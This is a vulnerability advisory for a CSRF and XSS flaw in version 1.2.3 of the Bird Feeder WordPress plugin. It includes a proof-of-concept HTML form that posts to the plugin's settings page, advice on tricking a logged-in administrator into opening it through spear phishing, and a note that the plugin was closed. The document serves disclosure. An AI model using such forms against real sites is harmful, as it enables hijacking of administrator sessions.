Product & Service Introduction:
===============================
This WordPress plugin will add the necessary data to the WordPress article feeds so that they can be picked up and 
processed correctly by the Bird Feeder Mint Pepper, without requiring any changes to any core WordPress files.
This plug-in serves one purpose and that is to tweet published posts. It doesn`t do anything other then tweet. 
It tweets in this format: [your message] [post title] [short url].On the options page you will have to enter 
your twitter username and password. You can also configure your message there.If you try to publish a bunch 
of posts quickly Bird Feeder url shortening service will not handle them and result un-expected tweets.

Discovery Status:
=================
Published


Affected Product(s):
====================
Wordpress
Product: Bird Feeder - Wordpress Plugin (Web-Application) 1.2.3


Exploitation Technique:
=======================
Remote


Severity Level:
===============
Medium


Technical Details & Description:
================================
A cross site request forgery issue and cross site scripting vulnerability has been discovered in the Bird Feeder v1.2.3 Plugin.

The plugin is vulnerable to a combination of CSRF/XSS attack meaning that if an admin user can be tricked to visit a special 
crafted URL created by a remote attacker (via spear phishing/social engineering), the attacker can insert arbitrary script code 
into admin page. Once exploited, admin’s browser can be made to do almost anything the admin user could typically do by 
hijacking admin`s cookies etc.


Proof of Concept (PoC):
=======================
You can use the following exploit code to exploit the vulnerability. For testing - you can just save it as .html and then get it clicked with an logged in administrator (by social engineering/spear phishing techniques) and see exploit in action. Almost majority of the fields are vulnerable to CSRF + XSS attack


<html>
  <body>
    <form action="http://localhost/wordpress/wp-admin/options-general.php?page=bird-feeder" method="POST">
      <input type="hidden" name="user" value="csrf/xss testing " />
      <input type="hidden" name="password" value="csrf/xss testing" />
      <input type="hidden" name="message" value="" />
      <input type="hidden" name="update" value="Update" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>


Solution - Fix & Patch:
=======================
2014-11-20:  WP Team action taken by closing the plugin and service


Security Risk:
==============
The security risk of the cross site request forgery and cross site scripting web vulnerability are estimated as medium. (CVSS 3.6)
